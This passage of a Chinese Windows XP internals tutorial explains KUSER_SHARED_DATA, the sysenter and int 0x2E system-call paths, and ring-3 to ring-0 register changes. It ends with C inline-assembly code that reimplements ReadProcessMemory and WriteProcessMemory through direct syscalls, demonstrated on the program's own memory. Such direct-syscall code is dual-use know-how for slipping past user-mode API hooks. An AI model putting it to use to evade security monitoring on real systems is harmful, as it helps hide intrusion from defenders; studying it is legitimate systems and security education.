<p><strong>特别说明：</strong>虽然指向的是同一个物理页，但<strong>在User 层是只读</strong>的，<strong>在Kernnel层是可读可写</strong>的。同一个物理页映射了两个线性地址，这两个线性地址的对应的访问权限不同。（PDE、PTE的R&#x2F;W位），使用<code>dd 0x7FFE0000</code>和<code>dd 0xFFDF0000</code>里面的数据是一样的。</p>
<p>该结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KUSER_SHARED_DATA <span class="number">0x7FFE0000</span></span><br><span class="line">ntdll!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLow     : <span class="number">0x1572</span></span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : <span class="number">0xfa00000</span></span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : <span class="number">0x14c</span></span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] <span class="number">0x43</span></span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x244</span> Reserved2        : [<span class="number">8</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : <span class="number">1</span> ( NtProductWinNt )</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : <span class="number">0x1</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x26c NtMajorVersion   : 5</span><br><span class="line">   +<span class="number">0x270</span> NtMinorVersion   : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x274</span> ProcessorFeatures : [<span class="number">64</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">   +<span class="number">0x2b4</span> Reserved1        : <span class="number">0x7ffeffff</span></span><br><span class="line">   +<span class="number">0x2b8</span> Reserved3        : <span class="number">0x80000000</span></span><br><span class="line">   +<span class="number">0x2bc</span> TimeSlip         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2c0</span> AlternativeArchitecture : <span class="number">0</span> ( StandardDesign )</span><br><span class="line">   +<span class="number">0x2c8</span> SystemExpirationDate : _LARGE_INTEGER <span class="number">0x0</span></span><br><span class="line">   +<span class="number">0x2d0</span> SuiteMask        : <span class="number">0x110</span></span><br><span class="line">   +<span class="number">0x2d4</span> KdDebuggerEnabled : <span class="number">0x3</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x2d5 NXSupportPolicy  : 0x2 &#x27;&#x27;</span><br><span class="line">   +<span class="number">0x2d8</span> ActiveConsoleId  : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2dc</span> DismountCount    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2e0</span> ComPlusPackage   : <span class="number">0xffffffff</span></span><br><span class="line">   +<span class="number">0x2e4</span> LastSystemRITEventTickCount : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x2e8</span> NumberOfPhysicalPages : <span class="number">0x3ff77</span></span><br><span class="line">   +<span class="number">0x2ec</span> SafeBootMode     : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">   +0x2f0 TraceLogging     : 0</span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : <span class="number">0xc3</span></span><br><span class="line">   +<span class="number">0x300</span> SystemCall       : <span class="number">0x7c92e4f0</span></span><br><span class="line">   +<span class="number">0x304</span> SystemCallReturn : <span class="number">0x7c92e4f4</span></span><br><span class="line">   +<span class="number">0x308</span> SystemCallPad    : [<span class="number">3</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x330</span> Cookie           : <span class="number">0x83dcba5</span></span><br></pre></td></tr></table></figure>

<p>在偏移<code>0x300</code>的地方即为<code>NtReadVirtualMemory</code>函数调用的<code>0x7FFE0300</code>处的函数，为一个<code>SystemCall</code>（系统调用函数）。该函数但汇编代码为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u <span class="number">0x7c92e4f0</span></span><br><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line"><span class="number">7</span>c92e4f4 c3              ret</span><br><span class="line"><span class="number">7</span>c92e4f5 <span class="number">8</span>da42400000000  lea     esp,[esp]</span><br><span class="line"><span class="number">7</span>c92e4fc <span class="number">8</span>d642400        lea     esp,[esp]</span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br></pre></td></tr></table></figure>

<p>可以看到该函数使用了指令<code>sysenter</code>进入到0环，同时EDX指向栈顶。该指令具体的实现请看下一节。</p>
<h3 id="2-3-SystemCall"><a href="#2-3-SystemCall" class="headerlink" title="2.3 SystemCall"></a>2.3 SystemCall</h3><p><strong>SystemCall</strong>是两个能从3环进入到0环的函数的名称。系统调用有<strong>中断调用</strong>和<strong>快速调用</strong>两种方式，中断调用是通过<mark class="label success">中断门</mark>进0环，此过程需要查IDT表和TSS表；快速调用则是使用<mark class="label warning">sysenter</mark>指令进0环，这种方式不需要查内存，而是直接从CPU的<strong>MSR寄存器</strong>中获取所需数据，所以称为快速调用。</p>
<div class="note info"><p>怎么判断系统是否支持快速调用？<br>当通过 <mark class="label danger">eax &#x3D; 1</mark> 来执行<code>cpuid</code>指令时，处理器的特征信息被放在 <mark class="label default">ecx</mark> 和 <mark class="label default">edx</mark> 寄存器中，其中edx包含了一个SEP位（EDX值的第12位，下标为11），该位指明了当前处理器知否支持<code>sysenter/sysexit</code>指令（SEP &#x3D;&#x3D; 1，支持）</p>
<ul>
<li>SEP &#x3D;&#x3D; 1，支持。SystemCall为：<br><code>ntdll.dll!KiFastSystemCall()</code></li>
<li>SEP &#x3D;&#x3D; 0，不支持。SystemCall为：<br><code>ntdll.dll!KiIntSystemCall()</code></li>
</ul>
</div>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ntdll!KiFastSystemCall:</span><br><span class="line"><span class="number">7</span>c92e4f0 <span class="number">8b</span>d4            mov     edx,esp</span><br><span class="line"><span class="number">7</span>c92e4f2 <span class="number">0f</span>34            sysenter</span><br><span class="line">  </span><br><span class="line">ntdll!KiIntSystemCall:</span><br><span class="line"><span class="number">7</span>c92e500 <span class="number">8</span>d542408        lea     edx,[esp+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>c92e504 cd2e            <span class="keyword">int</span>     <span class="number">2</span>Eh</span><br><span class="line"><span class="number">7</span>c92e506 c3              ret</span><br></pre></td></tr></table></figure>



<p>实验：</p>
<p>将eax &#x3D; 1，ecx &#x3D; 0、edx &#x3D; 0，执行<code>cpuid</code>指令前：</p>
<p><img data-src="https://s2.loli.net/2022/01/26/ItuSlcjqzDEWH7e.png" alt="2.png"></p>
<p>执行<code>cpuid</code>指令后如下图，edx &#x3D; 0x1F8BFBFF，B &#x3D; <strong>1</strong>011，第12位为1，说明支持快速调用。</p>
<p><img data-src="https://s2.loli.net/2022/01/26/Dg8BRmF7kTw1UrV.png" alt="3.png"></p>
<div class="note primary"><p>关于<code>KiFastSystemCall()</code>和<code>KiIntSystemCall()</code>这两个函数：</p>
<ol>
<li><strong>这两个函数都叫做SystemCall</strong>。如果系统支持快速调用，就会把KiFastSystemCall()函数的地址写到0x7FFE0300处。不支持就会把KiIntSystemCall()的函数地址写到0x7FFE0300处。</li>
<li>这两个函数的相同点：都是找新的CS、SS、ESP、EIP。不同点：找的方式不同。</li>
</ol>
</div>

<h3 id="2-4-3环进0环需要更改的4个寄存器"><a href="#2-4-3环进0环需要更改的4个寄存器" class="headerlink" title="2.4 3环进0环需要更改的4个寄存器"></a>2.4 3环进0环需要更改的4个寄存器</h3><p><strong>3环进0环需要更改哪些寄存器？</strong></p>
<ol>
<li>CS的权限由3变为0 ，意味着需要新的<strong>CS</strong>。</li>
<li>SS与CS的权限永远一致，需要新的<strong>SS</strong>。</li>
<li>权限发生切换的时候，堆栈也一定会切换，需要新的<strong>ESP</strong>。</li>
</ol>
<ol start="4">
<li>进0环后代码的位置，需要新的<strong>EIP</strong>。</li>
</ol>
<p>简单复习一下，中断门进0环时，我们在IDT表里填的中断门描述符，然后根据中断门描述符中的段选择子找到一个代码段描述符去提权，包含了0环的CS和EIP，而SS和0环的ESP是在TSS里存储的，当时我们还有一个结论，Windows里不使用任务，所以TSS的唯一作用就是提权时提供ESP0、SS0和EIP。</p>
<p>现在，我们知道了进0环需要更改的4个寄存器，接下来分析 KiFastSystemCall 和 KiIntSystemCall 时，只要明白一点，这两个函数做的事情就是更改这4个寄存器。</p>
<h3 id="2-4-重写ReadProcessMemory和WriteProcessMemory"><a href="#2-4-重写ReadProcessMemory和WriteProcessMemory" class="headerlink" title="2.4 重写ReadProcessMemory和WriteProcessMemory"></a>2.4 重写ReadProcessMemory和WriteProcessMemory</h3><div class="note danger"><p><strong>重写API最重要的六点：</strong></p>
<ol>
<li>进0环前函数服务号。</li>
<li>进0环的方式（中断门&#x2F;快速调用）。</li>
<li>进0环前寄存器的值（EAX、EDX）。</li>
<li>进0环前堆栈的值。<ul>
<li><strong>中断门进入0环时：</strong>中断门本身会将SS3、ESP3、EFLAG3、CS3、返回地址压栈，故不需要考虑堆栈恢复（被调用的API会自己POP返回地址）。</li>
<li><strong>快速调用进入0环时：</strong>需要自己压栈返回地址，且该<mark class="label danger">返回地址要紧挨着原来的参数</mark>，EBP指向的位置应该是第二个返回地址的坑，需要先将里面的值保存起来，还要保存起来原来的ESP，实际上就是在<mark class="label success">模拟中断门保存ESP和返回地址</mark>。</li>
</ul>
</li>
<li>进0环前返回地址。</li>
<li>大部分API调用约定都是<code>__stdcall</code>，被调用的API会自己平衡压入参数的堆栈。</li>
</ol>
</div>

<ol>
<li>服务号：函数服务号 &#x3D; 0xBA；</li>
<li>进0环的方式：<ul>
<li>中断门<code>int 0x2e</code>：EAX &#x3D; 服务号 &#x3D; 0xBA、EDX &#x3D; 第一个参数<strong>的地址</strong>。</li>
<li>快速调用<code>sysenter</code>：EAX &#x3D; 服务号 &#x3D; 0xBA。EDX &#x3D; 返回地址<strong>的地址</strong>。</li>
</ul>
</li>
<li>寄存器的值：第2点中所述。</li>
<li>进0环前堆栈的值：本函数仅需注意函数的返回地址。</li>
<li>返回地址：中断门无需提供返回地址（返回地址被压栈）、<mark class="label warning">快速调用需要自己压栈返回地址</mark>，且该返回地址要紧挨着原来的参数，EBP指向的坑需要放入当前的返回地址，原来的值需要先保存起来，还要保存起来原来的ESP，实际上就是在<strong>模拟中断门保存ESP和返回地址</strong>。。</li>
<li>注入函数的堆栈平衡。</li>
</ol>
<p>重写ReadProcessMemory，分析：</p>
<p>先观察原来API调用的堆栈变化：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/Mh3xgeUdlaZW1Km.png" alt="7.png"></p>
<p>可以看到，在函数<code>ReadProcessMemory(x,x,x,x)</code>中重新把自己的参数压栈了一次，目的是调用<code>NtReadVirtualMemory(x,x,x,x,x)</code>，然后调用一次函数压栈一次返回地址，总共调用了两次函数。所以自己重写API时，要让两个返回地址紧挨着堆栈里的参数。</p>
<p>如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//模拟中断门调用，保存esp和返回地址</span></span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ebp的坑应该是第二个函数返回地址，里面的值需要先保存起来</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;	<span class="comment">//esp的值也需要保存起来</span></span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0xBA</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtReadVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtReadVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;</span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>进入上面的函数时，堆栈情况如下：故当前EBP指向的位置（坑）需要放入第二个返回地址，需要先将里面的值保存起来，从0环返回时恢复。由于快速调用返回时ESP会变化，故ESP的值也需要保存起来（有必要时EBP的值也需要保存起来）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Debug模式下该函数的反汇编代码：</span><br><span class="line"><span class="number">004010</span>C0   push        ebp</span><br><span class="line"><span class="number">004010</span>C1   mov         ebp,esp</span><br><span class="line"><span class="number">004010</span>C3   sub         esp,<span class="number">4</span>Ch</span><br><span class="line"><span class="number">004010</span>C6   push        ebx</span><br><span class="line"><span class="number">004010</span>C7   push        esi</span><br><span class="line"><span class="number">004010</span>C8   push        edi</span><br><span class="line"><span class="number">004010</span>C9   lea         edi,[ebp<span class="number">-4</span>Ch]</span><br><span class="line"><span class="number">004010</span>CC   mov         ecx,<span class="number">13</span>h</span><br><span class="line"><span class="number">004010</span>D1   mov         eax,<span class="number">0</span>CCCCCCCCh</span><br><span class="line"><span class="number">004010</span>D6   rep stos    dword ptr [edi]</span><br><span class="line">  ...</span><br><span class="line">此时的堆栈情况：</span><br><span class="line"><span class="number">0012F</span>ECC  <span class="number">80</span> FF <span class="number">12</span> <span class="number">00</span>  ....	&lt;--EBP</span><br><span class="line"><span class="number">0012F</span>ED0  <span class="number">65</span> E2 <span class="number">40</span> <span class="number">00</span>  e.@.	&lt;--EBP+<span class="number">4</span>返回地址</span><br><span class="line"><span class="number">0012F</span>ED4  FF FF FF FF  ....	&lt;--参数<span class="number">1</span></span><br><span class="line"><span class="number">0012F</span>ED8  <span class="number">64</span> FF <span class="number">12</span> <span class="number">00</span>  d...	&lt;--参数<span class="number">2</span></span><br><span class="line"><span class="number">0012F</span>EDC  <span class="number">38</span> FF <span class="number">12</span> <span class="number">00</span>  <span class="number">8.</span>..	&lt;--参数<span class="number">3</span></span><br><span class="line"><span class="number">0012F</span>EE0  <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....	&lt;--参数<span class="number">4</span></span><br><span class="line"><span class="number">0012F</span>EE4  <span class="number">7</span>C FF <span class="number">12</span> <span class="number">00</span>  |...	&lt;--参数<span class="number">5</span></span><br><span class="line"><span class="number">0012F</span>EE8  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....</span><br><span class="line"><span class="number">0012F</span>EEC  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ....</span><br></pre></td></tr></table></figure>

<p>总结有：快速调用需要保存原来的ESP、返回地址（<strong>模拟中断门调用</strong>）。</p>
<p>注意，VC、VS内联汇编不支持<code>sysenter</code>指令，可以用<code>_emit</code>代替。</p>
<p>对<code>WriteProcessMemory</code>逆向分析可知，会先调用<code>NtProtectVirtualMemory(x,x,x,x,x)</code>对要写的内存进行权限检查等工作，如果可写就会调用<code>__imp__NtWriteVirtualMemory@20 ; NtWriteVirtualMemory(x,x,x,x,x)</code>进行内存写入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92DF90 ; <span class="function">__stdcall <span class="title">NtWriteVirtualMemory</span><span class="params">(x, x, x, x, x)</span></span></span><br><span class="line">.text:7C92DF90                 public _NtWriteVirtualMemory@20</span><br><span class="line">.text:<span class="number">7</span>C92DF90 _NtWriteVirtualMemory@<span class="number">20</span> proc near      ; CODE XREF: RtlInitializeContext(x,x,x,x,x)+AA↓p</span><br><span class="line">.text:<span class="number">7</span>C92DF90                                         ; RtlCreateUserProcess(x,x,x,x,x,x,x,x,x,x)+<span class="number">1F</span>2↓p ...</span><br><span class="line">.text:<span class="number">7</span>C92DF90                 mov     eax, <span class="number">115</span>h       ; NtWriteVirtualMemory</span><br><span class="line">.text:<span class="number">7</span>C92DF95                 mov     edx, <span class="number">7F</span>FE0300h</span><br><span class="line">.text:<span class="number">7</span>C92DF9A                 call    dword ptr [edx]</span><br><span class="line">.text:<span class="number">7</span>C92DF9C                 retn    <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C92DF9C _NtWriteVirtualMemory@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>

<p>重写实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（中断门调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ReadProcessMemory_INT</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD NtStatus;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 直接模拟 KiIntSystemCall</span></span><br><span class="line">		lea edx,hProcess; <span class="comment">// 要求 edx 存储最后入栈的参数</span></span><br><span class="line">		mov eax, <span class="number">0xBA</span>;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x2E</span>;</span><br><span class="line">		mov NtStatus, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (NtStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（快速调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ReadProcessMemory_FAST</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD ntStatus;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	DWORD dwESP;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">//模拟中断门调用，保存esp和返回地址</span></span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ebp的坑应该是第二个函数返回地址，里面的值需要先保存起来</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;	<span class="comment">//esp的值也需要保存起来</span></span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0xBA</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtReadVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtReadVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;	<span class="comment">//恢复esp</span></span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;	<span class="comment">//恢复原来的ebp坑里面的值</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (ntStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写进程内存（中断门调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory_INT</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                   LPDWORD </span></span></span><br><span class="line"><span class="function"><span class="params">                                   lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LONG NtStatus;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 直接模拟 KiIntSystemCall</span></span><br><span class="line">		lea edx,hProcess; <span class="comment">// 要求 edx 存储最后入栈的参数</span></span><br><span class="line">		mov eax, <span class="number">0x115</span>;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x2E</span>;</span><br><span class="line">		mov NtStatus, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (NtStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读进程内存（快速调用）</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory_FAST</span><span class="params">(HANDLE hProcess, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPCVOID lpBaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPVOID lpBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    DWORD nSize, </span></span></span><br><span class="line"><span class="function"><span class="params">                                    LPDWORD lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                   )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD ntStatus;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	DWORD dwESP;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,[ebp];	<span class="comment">//ecx保存上一个函数的返回地址</span></span><br><span class="line">		mov dwRet,eax;</span><br><span class="line">		mov dwESP,esp;</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0x115</span>;	<span class="comment">//设置系统服务号</span></span><br><span class="line">		lea ebx, NtWriteVirtualMemoryRet;<span class="comment">//call KiFastSystemCall的返回地址</span></span><br><span class="line">		mov [ebp],ebx;	<span class="comment">//把新的返回地址填到返回地址的坑</span></span><br><span class="line">		mov edx,ebp;	<span class="comment">//edx = 返回地址的地址</span></span><br><span class="line">		_emit <span class="number">0x0F</span>;	<span class="comment">//sysenter </span></span><br><span class="line">		_emit <span class="number">0x34</span>;</span><br><span class="line">NtWriteVirtualMemoryRet:</span><br><span class="line">		mov ntStatus,eax;<span class="comment">//函数返回值</span></span><br><span class="line">		mov esp,dwESP;</span><br><span class="line">		mov eax,dwRet;</span><br><span class="line">		mov [ebp],eax;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lpNumberOfBytesRead != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*lpNumberOfBytesRead = nSize;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 错误检查</span></span><br><span class="line">	<span class="keyword">if</span> (ntStatus &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwReadLen = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> szRead[] = &#123;<span class="string">&quot;This is Test Read Data.&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szWrite[] = &#123;<span class="string">&quot;Write Data.&quot;</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szBufferRead[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;原数据为：%s\n&quot;</span>,szRead);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FASTCALL调用方式读取的数据为：%s\n&quot;</span>,szBufferRead);</span><br><span class="line">	<span class="built_in">memset</span>(szBufferRead,<span class="number">0</span>,<span class="keyword">sizeof</span>(szBufferRead));</span><br><span class="line">	ReadProcessMemory_INT(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;INT调用方式读取的数据为：%s\n&quot;</span>,szBufferRead);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;写入的数据为：%s\n&quot;</span>,szWrite);</span><br><span class="line">	WriteProcessMemory_INT(GetCurrentProcess(),(LPCVOID)((DWORD)szRead+<span class="number">4</span>),szWrite,<span class="keyword">sizeof</span>(szWrite),&amp;dwReadLen);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FAST调用方式读取写入后读取INT写入的数据为：%s\n&quot;</span>,szRead);</span><br><span class="line">	</span><br><span class="line">	WriteProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)((DWORD)szRead+<span class="number">4</span>),<span class="string">&quot;HHHH&quot;</span>,<span class="keyword">sizeof</span>(szWrite),&amp;dwReadLen);</span><br><span class="line">	ReadProcessMemory_FAST(GetCurrentProcess(),(LPCVOID)szRead,szBufferRead,<span class="keyword">sizeof</span>(szRead),&amp;dwReadLen);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FAST调用方式读取写入后读取FAST写入的数据为：%s\n&quot;</span>,szRead);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/28/NCOkj3arnwZRpfo.png" alt="6.png"></p>
